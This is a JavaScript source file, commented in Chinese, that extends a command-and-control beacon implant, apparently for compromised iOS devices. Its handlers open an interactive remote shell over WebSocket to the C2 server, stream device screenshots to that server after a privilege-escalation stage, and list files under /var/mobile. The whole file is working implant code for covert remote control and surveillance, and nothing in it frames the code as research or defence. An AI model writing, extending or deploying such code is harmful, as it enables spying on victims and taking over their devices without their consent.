/**
 * beacon_complete_integration.js — Beacon 完整集成
 * 
 * 这个文件包含所有新命令的完整实现，直接可用
 * 加载到 beacon.js 后面即可
 */

(function() {
  'use strict';

  // 确保有全局命令处理器
  if (typeof CMD_HANDLERS === 'undefined') {
    globalThis.CMD_HANDLERS = {};
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // 交互式 Shell 相关
  // ═══════════════════════════════════════════════════════════════════════════

  let shellWs = null;
  let shellBuffer = [];
  const MAX_SHELL_BUFFER = 10000;

  CMD_HANDLERS.start_interactive_shell = function(args) {
    const c2Url = (args && args.c2Url) ? args.c2Url : (typeof getCurrentC2 === 'function' ? getCurrentC2() : location.origin);
    
    return new Promise((resolve, reject) => {
      if (shellWs && shellWs.readyState !== WebSocket.CLOSED) {
        return resolve('[shell] 已有活跃会话');
      }

      const deviceId = getDeviceId();
      const wsUrl = c2Url.replace(/^http/, 'ws') + '/ws/shell/' + deviceId;

      shellWs = new WebSocket(wsUrl);
      shellBuffer = [];

      shellWs.onopen = () => {
        resolve('[shell] 会话已建立: ' + wsUrl);
      };

      shellWs.onmessage = (event) => {
        try {
          const msg = JSON.parse(event.data);
          
          if (msg.type === 'output') {
            const output = atob(msg.data);
            shellBuffer.push(output);
            if (shellBuffer.length > MAX_SHELL_BUFFER) {
              shellBuffer = shellBuffer.slice(-MAX_SHELL_BUFFER);
            }
          } else if (msg.type === 'exit') {
            shellBuffer.push(`\n[Shell exited: code=${msg.exitCode}]\n`);
            shellWs.close();
          }
        } catch (e) {}
      };

      shellWs.onerror = (error) => {
        reject('[shell] 连接错误: ' + (error.message || 'Unknown'));
      };

      shellWs.onclose = () => {
        shellWs = null;
      };
    });
  };

  CMD_HANDLERS.shell_exec = function(args) {
    const command = (args && args.cmd) ? args.cmd : '';
    
    return new Promise((resolve) => {
      if (!shellWs || shellWs.readyState !== WebSocket.OPEN) {
        return resolve('[shell] 会话未建立，请先执行 start_interactive_shell');
      }
      
      if (!command) {
        return resolve('[shell] 未指定命令');
      }

      try {
        const input = command + '\n';
        shellWs.send(JSON.stringify({
          type: 'input',
          data: btoa(input)
        }));
        resolve('[shell] 已发送命令: ' + command);
      } catch (e) {
        resolve('[shell] 发送失败: ' + e.message);
      }
    });
  };

  CMD_HANDLERS.shell_get_output = function(args) {
    const lines = (args && args.lines) ? parseInt(args.lines) : 50;
    
    return new Promise((resolve) => {
      const output = shellBuffer.slice(-lines).join('');
      resolve('[shell] 输出 (' + shellBuffer.length + ' 行缓冲):\n' + output);
    });
  };

  CMD_HANDLERS.shell_close = function() {
    return new Promise((resolve) => {
      if (shellWs) {
        shellWs.close();
        shellWs = null;
        shellBuffer = [];
        resolve('[shell] 会话已关闭');
      } else {
        resolve('[shell] 无活跃会话');
      }
    });
  };

  // ═══════════════════════════════════════════════════════════════════════════
  // 屏幕流相关
  // ═══════════════════════════════════════════════════════════════════════════

  let streamWs = null;
  let streamInterval = null;
  let streamFrameCount = 0;
  let lastFrameHash = '';

  CMD_HANDLERS.start_screen_stream = function(args) {
    const c2Url = (args && args.c2Url) ? args.c2Url : (typeof getCurrentC2 === 'function' ? getCurrentC2() : location.origin);
    const fps = (args && args.fps) ? parseInt(args.fps) : 2;
    const quality = (args && args.quality) ? parseInt(args.quality) : 60;

    return new Promise((resolve, reject) => {
      if (streamWs && streamWs.readyState !== WebSocket.CLOSED) {
        return resolve('[screen] 已有活跃流');
      }

      if (typeof nativeScreenshot !== 'function') {
        return reject('[screen] nativeScreenshot 不可用，需先完成 PE 阶段');
      }

      const deviceId = getDeviceId();
      const wsUrl = c2Url.replace(/^http/, 'ws') + `/ws/screen/${deviceId}?fps=${fps}&quality=${quality}`;

      streamWs = new WebSocket(wsUrl);
      streamFrameCount = 0;
      lastFrameHash = '';

      streamWs.onopen = () => {
        // 开始定期截图
        const intervalMs = 1000 / fps;
        streamInterval = setInterval(() => {
          captureAndSendFrame();
        }, intervalMs);

        resolve(`[screen] 流已启动: ${fps}fps, 质量${quality}`);
      };

      streamWs.onmessage = (event) => {
        try {
          const msg = JSON.parse(event.data);
          if (msg.type === 'config') {
            console.log('[Screen] Config:', msg);
          }
        } catch (e) {}
      };

      streamWs.onerror = (error) => {
        if (streamInterval) {
          clearInterval(streamInterval);
          streamInterval = null;
        }
        reject('[screen] 连接错误: ' + (error.message || 'Unknown'));
      };

      streamWs.onclose = () => {
        if (streamInterval) {
          clearInterval(streamInterval);
          streamInterval = null;
        }
        streamWs = null;
      };
    });
  };

  function captureAndSendFrame() {
    if (!streamWs || streamWs.readyState !== WebSocket.OPEN) {
      return;
    }

    try {
      const base64Frame = nativeScreenshot();
      if (!base64Frame) return;

      // 简单差分检测
      const hash = simpleHash(base64Frame.substring(0, 1000));
      if (hash === lastFrameHash) {
        return; // 画面无变化，跳过
      }
      lastFrameHash = hash;
      streamFrameCount++;

      streamWs.send(JSON.stringify({
        type: 'frame',
        data: base64Frame,
        timestamp: Date.now(),
        frameNumber: streamFrameCount
      }));
    } catch (e) {
      console.error('[Screen] Capture error:', e);
    }
  }

  function simpleHash(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    return hash.toString(36);
  }

  CMD_HANDLERS.stop_screen_stream = function() {
    return new Promise((resolve) => {
      if (streamInterval) {
        clearInterval(streamInterval);
        streamInterval = null;
      }
      
      if (streamWs) {
        streamWs.close();
        streamWs = null;
        resolve(`[screen] 流已停止，共推送 ${streamFrameCount} 帧`);
      } else {
        resolve('[screen] 无活跃流');
      }
    });
  };

  CMD_HANDLERS.screen_stream_status = function() {
    return new Promise((resolve) => {
      const status = {
        active: streamWs && streamWs.readyState === WebSocket.OPEN,
        frameCount: streamFrameCount,
        lastHash: lastFrameHash
      };
      resolve('[screen] 状态: ' + JSON.stringify(status));
    });
  };

  // ═══════════════════════════════════════════════════════════════════════════
  // 文件浏览增强
  // ═══════════════════════════════════════════════════════════════════════════

  CMD_HANDLERS.list_files_json = function(args) {
    const dirPath = (args && args.path) ? args.path : '/var/mobile';
    
    return new Promise((resolve) => {
      try {
        if (typeof nativeListDir !== 'function') {
          return resolve({
            status: 'failed',
            bridgeReady: false,
            output: '[ls] native bridge 未就绪'
          });
        }

        const entries = nativeListDir(dirPath);
        const files = entries.map(name => {
          const fullPath = dirPath + '/' + name;
          const isDir = name.endsWith('/') || checkIsDir(fullPath);
          return {
            name: name.replace(/\/$/, ''),
            isDir: isDir,
            size: 0,
            mtime: 0,
            path: fullPath
          };
        });

        resolve('[ls] ' + dirPath + '\n' + JSON.stringify(files, null, 2));
      } catch(e) {
        resolve('[ls] error: ' + e.message);
      }
    });
  };

  function checkIsDir(path) {
    // 简单启发式判断（基于常见目录名）
    const dirPatterns = [
      'Library', 'Documents', 'Applications', 'System', 
      'var', 'usr', 'bin', 'sbin', 'tmp', 'etc'
    ];
    const name = path.split('/').pop();
    return dirPatterns.some(p => name.includes(p)) || !name.includes('.');
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // 挂载到全局
  // ═══════════════════════════════════════════════════════════════════════════

  console.log('[Beacon] Complete integration loaded, added commands:', Object.keys(CMD_HANDLERS).length);

})();